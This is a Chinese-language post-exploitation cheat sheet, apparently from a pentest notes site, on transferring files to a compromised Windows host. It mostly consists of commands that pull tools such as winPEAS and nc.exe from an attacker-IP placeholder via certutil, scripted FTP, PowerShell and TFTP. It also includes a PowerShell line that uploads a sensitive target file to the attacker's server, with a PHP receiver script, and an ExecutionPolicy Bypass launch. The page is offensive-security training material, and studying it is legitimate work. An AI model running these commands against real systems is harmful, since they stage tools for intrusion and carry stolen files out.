---
description: 在目标系统中已经成功建立立足点后，需要传输一些脚本到目标系统中，以实现后续的提权操作
---

# ✔️ Windows文件传输 - Windows File Transfer

## 常用工具

1. certutil.exe
2. FTP
3. Powershell

## 常规方法

### 利用certutil.exe传输

{% hint style="info" %}
首选，兼容老旧的Windows系统：Windows XP / Windows Server 2003 / Windows Vista / Windows Server 2008 / Windows 7 /...

因为老旧的Windows系统没有默认安装或者安装的不是完整版的Powershell，但是certutil.exe是所有Windows系统都有的程序。
{% endhint %}

```bash
// Attacker
python3 -m http.server 8888
```

```
// Target
certutil -urlcache -f http://攻方IP:8888/winPEAS.exe winpeas.exe
```

### certutil.exe其他用法

```
// 从互联网上下载程序
certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
certutil.exe -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt
//对文件进行Base64编码
certutil -encode inputFileName encodedOutputFileName
//解码已被Base64编码的文件
certutil -decode encodedInputFileName decodedOutputFileName
//解码已被16进制编码的文件
certutil --decodehex encoded_hexadecimal_InputFileName
```

### 利用FTP传输

大多是Windows机器都有FTP客户端，但是无法交互使用（可能会杀掉shell）。解决办法：

1. 首先在攻方主机上，自己配置好FTP服务器（用于登录的用户凭证）；
2. 在目标主机上操作，将待执行的命令依次写入一个文本文件中；
3. 将该文本文件作为FTP的输入，执行（即反向连接到攻方FTP服务器）。

```bash
// Target
echo open 攻方IP 21> ftp.txt
echo USER 用户名>> ftp.txt
echo 密码>> ftp.txt
echo bin>> ftp.txt
echo GET wget.exe>> ftp.txt
echo bye>> ftp.txt
```

```bash
// Target
ftp -v -n -s:ftp.txt
```

### 利用Powershell传输

#### 下载

```powershell
// Target
Invoke-WebRequest -URL http://<攻方IP>/nc.exe -OutFile nc.exe
```

```bash
// Target
wget http://攻方IP/nc.exe -o nc.exe
```

#### 上传

```powershell
// Target
powershell(New-ObjectSystem.Net.WebClient).UploadFile('http://<攻方IP>/uploadwindows.php','.\<目标上的敏感文件>')
```

在攻方主机/var/www/html目录下分别创建：/uploads目录和uploadwindows.php文件

```php
// uploadwindows.php
<?php
$uploaddir = '/var/www/html/uploads/';
$uploadfile = $uploaddir.$_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'],$uploadfile)
?>
```

#### 其他下载方法

在目标系统上，先创建一个Powershell脚本，然后调用语法执行该脚本：

```
// Target创建wget.ps1脚本
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://攻方IP/file.exe" >>wget.ps1
echo $file = "output-file.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```

```powershell
// Target
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

## 利用TFTP传输

适用于（默认安装了TFTP）：Windows XP / Windows 2003 / Kali内置

可以非交互式使用，shell被杀掉的可能性很小。

```bash
// Attacker
# 在攻方Kali主机上
atftpd --daemon --port 69 /tftp
/etc/init.d/atftpd restart

# 然后将要传输的文件或程序放进/srv/tftp 中，并确认TFTP服务器是否被正确运行：
netstat -a -p UDP | grep udp

# 从目标Windows系统上下载所需的内容
tftp -i 目标IP GET wget.exe
```



##

